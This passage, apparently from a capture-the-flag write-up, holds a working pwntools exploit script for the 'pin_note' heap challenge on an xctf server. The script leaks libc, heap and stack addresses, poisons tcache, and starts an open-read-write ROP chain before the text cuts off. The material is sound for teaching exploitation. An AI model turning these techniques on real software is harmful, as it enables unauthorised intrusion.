</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.1.11 123&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./pin_note&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>),</span><span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=n>elf</span>  <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.31.251&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x02814
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x024F9
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x02A01
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl><span class=c1>#io = start([])</span>
</span></span><span class=line><span class=cl><span class=c1>#p = start([])</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-ba8fe96c99.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-ba8fe96c99.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sc_pwd</span><span class=p>(</span><span class=n>pwd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;rs): &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>note</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;add&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>text</span><span class=o>=</span><span class=s1>&#39;123&#39;</span><span class=p>,</span><span class=n>y</span><span class=o>=</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;edit&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;edit: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;newsize: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;(y/n): &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>y</span><span class=o>==</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;show&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;show: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;del&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;delete: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwd</span> <span class=o>=</span> <span class=s1>&#39;M&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc_pwd</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x21b110</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x3f0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>5</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>key</span> <span class=o>&lt;&lt;</span> <span class=mh>0xC</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;heap_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;rs): &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;select: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;$&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;add&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;note: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x200</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x108</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x111</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>key</span> <span class=o>^</span> <span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x2a0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x200</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>environ</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t1</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>-</span> <span class=mh>0x2b0</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>t1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rax&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rsi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x00000000000a85a9</span> <span class=c1># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=c1>#rdx = libc_rop.find_gadget([&#39;pop rdx&#39;,&#39;pop rbx&#39;,&#39;ret&#39;])[0]; m = 2</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;syscall&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>orw_rop_addr</span> <span class=o>=</span> <span class=n>t1</span> <span class=c1># ret to addr</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>orw_rop_addr</span> <span class=o>+</span> <span class=mh>0xa0</span> <span class=o>+</span> <span class=n>m</span><span class=o>*</span><span class=mi>3</span><span class=o>*</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>orw_rop</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x10000000000000000</span><span class=o>-</span><span class=mi>100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=n>m</span>       <span class=o>+</span>     <span class=n>p64</span><span class=p>(</span><span class=n>rax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>257</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
